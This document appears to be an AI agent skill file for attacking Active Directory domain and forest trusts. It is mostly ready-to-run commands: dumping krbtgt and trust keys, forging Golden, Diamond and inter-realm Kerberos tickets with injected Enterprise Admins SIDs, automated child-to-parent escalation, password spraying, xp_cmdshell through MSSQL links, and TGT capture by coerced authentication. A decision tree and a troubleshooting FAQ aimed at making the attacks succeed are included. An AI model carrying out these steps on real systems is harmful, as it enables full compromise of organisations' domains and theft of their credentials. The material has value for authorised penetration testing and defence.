---
name: ad-trust-attack
description: "Domain trust relationship attacks. Use when the target has a multi-domain or multi-forest environment. Covers parent-child domain privilege escalation (Golden Ticket + ExtraSid), cross-forest attacks (SID History/MSSQL Trust Links), and one-way trust abuse. Load this first when child-domain Domain Admin access is obtained or a trust relationship is discovered."
zh-signals: "枚举并利用 Active Directory 域信任关系实现跨域/跨林提权与横向移动。信号:域信任,父子域提权,ExtraSid,跨林攻击,Golden Ticket。"
when-to-use: >-
  Use when a target environment has multiple domains or forests, when you already hold child-domain Domain Admin or krbtgt material, or when trust relationships must be enumerated and exploited for cross-domain privilege escalation.
metadata:
  tags: "domain-trust,forest-trust,child-parent,extrasid,sid-filtering,golden-ticket,diamond-ticket,raiseChild,cross-forest,trust-enumeration,kerberos"
  category: "lateral"
---

# Domain Trust Relationship Attacks

Enumerate and exploit Active Directory trust relationships to achieve lateral movement and privilege escalation across domains and forests.

## Trigger Conditions

- Child-domain Domain Admin or krbtgt hash obtained, and elevation to the parent domain is required
- Domain or forest trust relationships discovered during enumeration
- The target environment has a multi-domain or multi-forest architecture
- Lateral movement across trust boundaries is required

## Prerequisites

- High-privilege credentials in the current domain (Domain Admin / krbtgt hash / trust key)
- Trust relationship enumeration completed or the trust topology is already known
- Tools: ticketer.py, raiseChild.py, secretsdump.py, lookupsid.py, Rubeus, ldeep, NetExec

---

## Phase 1: Trust Relationship Enumeration

```bash
ldeep ldap -u <USER> -p <PASSWORD> -d <DOMAIN> -s ldap://<DC> trusts
netexec ldap <DC_IP> -u '<USER>' -p '<PASSWORD>' -d '<DOMAIN>' -M enum_trusts
bloodhound-python -u <USER> -p <PASSWORD> -d <DOMAIN> -c Trusts
```

```powershell
Get-DomainTrust                              # PowerView
Get-ForestTrust                              # Forest trust
nltest /domain_trusts /all_trusts            # Native Windows
```

### Interpreting the Output

| Field | Meaning |
|------|------|
| TrustDirection: Bidirectional | Two-way trust, accessible in both directions |
| TrustDirection: Inbound | The other side trusts us, we can access the other side |
| TrustDirection: Outbound | We trust the other side, the other side can access us |
| TrustAttributes: WITHIN_FOREST | Within the forest, no SID filtering |
| TrustAttributes: FOREST_TRANSITIVE | Forest trust, SID filtering applies |

---

## Phase 2: Trust Type and Attack Surface Analysis

### Trust Type Quick Reference

| Trust type | Direction | SID filtering | Main attack method |
|----------|------|----------|-------------|
| **Parent-Child** | Bidirectional | Disabled | Golden Ticket + ExtraSid |
| **Tree-Root** | Bidirectional | Disabled | Golden Ticket + ExtraSid |
| **External** | One-way | Enabled | External group members / password reuse |
| **Forest** | Bidirectional | Enabled | SID History (restricted) / MSSQL Links |

### Key Trust Attributes

| Attribute | Value | Security meaning |
|------|-----|---------|
| WITHIN_FOREST | 0x20 | Within the forest, no SID filtering |
| FOREST_TRANSITIVE | 0x08 | Forest trust, SID filtering applies |
| TREAT_AS_EXTERNAL | 0x40 | Treated as external, SID filtering enabled |
| QUARANTINED_DOMAIN | 0x04 | Domain quarantine, SID filtering enforced |

### SID Filtering Impact

| Trust type | ExtraSid attack | Notes |
|----------|--------------|------|
| Within forest (WITHIN_FOREST) | Fully usable | Enterprise Admins (-519) valid |
| External / forest trust | RID > 1000 only | Well-known SIDs are filtered |
| Quarantined domain | Extremely restricted | Almost everything is filtered |

---

## Phase 3: Child-to-Parent Domain Privilege Escalation

**Core principle**: there is no SID filtering within the same forest, so the parent-domain Enterprise Admins SID (-519) can be injected into tickets issued by the child-domain krbtgt.

### 3.1 Gather the Required Information

```bash
# Get the child domain SID
lookupsid.py <CHILD_DOMAIN>/<USER>:<PASSWORD>@<CHILD_DC> 0

# Get the parent domain SID (Enterprise Admins = parent SID + "-519")
lookupsid.py <CHILD_DOMAIN>/<USER>:<PASSWORD>@<PARENT_DC> 0

# Dump the child-domain krbtgt hash
secretsdump.py -just-dc-user '<CHILD_DOMAIN>/krbtgt' \
  '<CHILD_DOMAIN>/<USER>:<PASSWORD>@<CHILD_DC>'
```

### 3.2 Golden Ticket + ExtraSid

```bash
ticketer.py -nthash <KRBTGT_NTHASH> \
  -domain-sid '<CHILD_SID>' \
  -domain <CHILD_DOMAIN> \
  -extra-sid '<PARENT_SID>-519' \
  fakeadmin

export KRB5CCNAME=fakeadmin.ccache
secretsdump.py -k -no-pass <PARENT_DOMAIN>/fakeadmin@<PARENT_DC>
```

```powershell
# Rubeus (AES256 is stealthier)
Rubeus.exe golden /aes256:<KRBTGT_AES256> /user:Administrator \
  /domain:<CHILD_DOMAIN> /sid:<CHILD_SID> /sids:<PARENT_SID>-519 /nowrap
```

### 3.3 Diamond Ticket Variant

Modify the PAC of a legitimate TGT instead of forging one from scratch, bypassing some detections:

```powershell
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 \
  /groups:519 /sids:<PARENT_SID>-519 /krbkey:<KRBTGT_AES256> /nowrap
```

### 3.4 raiseChild.py Automation

```bash
raiseChild.py -target-exec <PARENT_DC> '<CHILD_DOMAIN>/Administrator:<PASSWORD>'
raiseChild.py -target-exec <PARENT_DC> -hashes :<NTHASH> '<CHILD_DOMAIN>/Administrator'
```

### 3.5 Trust Ticket (Inter-Realm TGT)

```bash
# Dump the trust key
secretsdump.py '<CHILD_DOMAIN>/Administrator:<PASSWORD>@<CHILD_DC>' | grep -i trust

# Forge a cross-domain TGT
ticketer.py -nthash <TRUST_KEY_HASH> \
  -domain-sid '<CHILD_SID>' \
  -domain <CHILD_DOMAIN> \
  -spn krbtgt/<PARENT_DOMAIN> \
  fakeuser

export KRB5CCNAME=fakeuser.ccache
getST.py -k -no-pass -spn cifs/<PARENT_DC>.<PARENT_DOMAIN> <PARENT_DOMAIN>/fakeuser
```

> Detailed steps and method comparison -> [references/child-parent-escalation.md](references/child-parent-escalation.md)

---

## Phase 4: One-Way Trust Abuse

### 4.1 Inbound Trust

The external domain trusts us, so our users can access resources in the external domain.

```powershell
# Find our domain users/groups in the external domain
Get-DomainForeignGroupMember -Domain <EXTERNAL_DOMAIN>
ConvertFrom-SID S-1-5-21-<MEMBER_SID>
```

```powershell
# Cross-domain ticket requests
Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /aes256:<AES256> /nowrap
Rubeus.exe asktgs /service:krbtgt/<EXTERNAL_DOMAIN> /domain:<DOMAIN> \
  /dc:<DC> /ticket:<TGT_BASE64> /nowrap
Rubeus.exe asktgs /service:cifs/<EXTERNAL_DC> /domain:<EXTERNAL_DOMAIN> \
  /dc:<EXTERNAL_DC> /ticket:<REFERRAL_TICKET> /nowrap
```

### 4.2 Outbound Trust

We trust the external domain, so the trust key can be obtained for further exploitation.

```powershell
# Dump the trust key
mimikatz lsadump::trust /patch
```

```bash
# DCSync the trust account
secretsdump.py -just-dc-user '<EXTERNAL_DOMAIN>$' \
  '<DOMAIN>/Administrator:<PASSWORD>@<DC>'

# Use the trust account identity for attacks such as Kerberoast
Rubeus.exe asktgt /user:<DOMAIN>$ /domain:<EXTERNAL_DOMAIN> /rc4:<TRUST_KEY> /nowrap
```

---

## Phase 5: Cross-Forest Attacks

**Scenario**: a forest trust exists with SID filtering, so alternative attack paths are needed.

### 5.1 SID History (Restricted)

```bash
# Find a valuable group with RID > 1000 in the target forest, create a Golden Ticket injecting its SID
ticketer.py -nthash <KRBTGT_HASH> \
  -domain-sid '<SOURCE_SID>' \
  -domain <SOURCE_DOMAIN> \
  -extra-sid '<TARGET_SID>-1111' \
  fakeuser

export KRB5CCNAME=fakeuser.ccache
smbclient.py -k -no-pass <TARGET_DOMAIN>/fakeuser@<TARGET_DC>
```

### 5.2 External Group Members

```powershell
Get-DomainForeignGroupMember -Domain <TARGET_FOREST>
Get-DomainForeignUser -Domain <TARGET_FOREST>
```

### 5.3 Password Reuse

```bash
netexec smb <TARGET_DC> -u '<USER>' -p '<PASSWORD>' -d '<TARGET_FOREST>'
netexec smb <TARGET_DC> -u users.txt -p passwords.txt -d '<TARGET_FOREST>'
```

### 5.4 MSSQL Linked Server

```sql
-- Enumerate linked servers
SELECT * FROM master..sysservers;

-- Execute on the linked server
EXEC ('SELECT SYSTEM_USER') AT [LINKED_SERVER];

-- Chain traversal
EXEC ('EXEC (''SELECT SYSTEM_USER'') AT [SECOND_LINK]') AT [FIRST_LINK];

-- Execute commands through the link (requires xp_cmdshell)
EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER];
```

### 5.5 Unconstrained Delegation Across Domains

```bash
# Find unconstrained delegation -> coerce the target forest DC to authenticate -> capture the TGT
Get-DomainComputer -Unconstrained -Domain <SOURCE_DOMAIN>
Rubeus.exe monitor /interval:5 /nowrap /filteruser:<TARGET_DC>$
# Trigger: PrinterBug / PetitPotam / DFSCoerce
Rubeus.exe ptt /ticket:<CAPTURED_TGT>
```

### 5.6 Cross-Trust ACL Abuse

```powershell
Get-DomainObjectAcl -Domain <TARGET_FOREST> |
  Where-Object {$_.SecurityIdentifier -match 'S-1-5-21-<SOURCE_SID>'}
```

> Detailed attack techniques and real-world cases -> [references/cross-forest-attack.md](references/cross-forest-attack.md)

---

## Decision Tree

```
[Start] Domain trust discovered / child-domain DA obtained
    │
    ├─ Enumerate: ldeep / NetExec / PowerView / BloodHound / nltest
    │
    ▼
[Analyze] Trust type?
    │
    ├─ WITHIN_FOREST (parent-child/tree-root) ───────────────────────┐
    │   └─ No SID filtering                                          │
    │       ├─ Have krbtgt ── Golden Ticket + ExtraSid(-519)         ┤
    │       ├─ Need stealth ── Diamond Ticket                        ┤
    │       ├─ Want speed ── raiseChild.py                           ┤
    │       └─ Have trust key ── Trust Ticket                        ┤
    │                                                                 ▼
    │                                       Obtain parent DA -> DCSync
    │
    ├─ FOREST_TRANSITIVE (forest trust) ─────────────────────────────┐
    │   └─ SID filtering applies (RID > 1000 passes)                 │
    │       ├─ RID>1000 group ── SID History                         ┤
    │       ├─ Foreign group member ── authorized cross-forest       ┤
    │       ├─ Password reuse ── netexec spray                       ┤
    │       ├─ MSSQL link ── xp_cmdshell                             ┤
    │       └─ Unconstrained delegation ── cross-forest TGT          ┤
    │                                                                 ▼
    │                                              Cross-forest access
    │
    ├─ Inbound (the other side trusts us) ───────────────────────────┐
    │   ├─ Find foreign group members ── ForeignGroupMember          ┤
    │   └─ Cross-domain ticket request ── Rubeus asktgt/asktgs       ┤
    │                                                                 ▼
    │                                       Access the external domain
    │
    └─ Outbound (we trust the other side) ───────────────────────────┐
        ├─ Dump trust key ── lsadump::trust / DCSync                 ┤
        └─ Trust account login ── Kerberoast the target domain       ┤
    │                                                                 ▼
    │                                    Foothold in the target domain
```

---

## Verification Checklist

- [ ] Enumerate all trust relationships (type, direction, attributes)
- [ ] Determine the SID filtering state (WITHIN_FOREST vs FOREST_TRANSITIVE)
- [ ] Obtain the required credentials (krbtgt hash / trust key / DA password)
- [ ] Select the attack method based on the trust type
- [ ] Execute the cross-domain / cross-forest attack and verify access
- [ ] DCSync the target domain to obtain full credentials

---

## FAQ

### ExtraSid Attack Fails

1. Confirm it is a within-forest trust (WITHIN_FOREST=0x20); external and forest trusts filter -519
2. Check that the krbtgt hash is correct and the domain SID matches

### raiseChild.py Fails

1. Confirm you have child-domain DA rights and can DCSync
2. Check network connectivity to the parent-domain DC
3. Run the steps manually: lookupsid -> secretsdump -> ticketer

### Cross-Forest SID History Does Not Work

1. Confirm the target group RID > 1000 (well-known SIDs are filtered)
2. Check whether SID History is enabled on the trust (disabled by default)

---

## Tool Reference

| Tool | Purpose |
|------|------|
| ldeep / NetExec / BloodHound | Trust enumeration and visualization |
| lookupsid.py | Domain SID lookup |
| secretsdump.py | krbtgt / trust key dumping |
| ticketer.py | Golden Ticket / Trust Ticket |
| raiseChild.py | Automated child-to-parent domain privilege escalation |
| Rubeus / mimikatz | Windows ticket operations and key dumping |
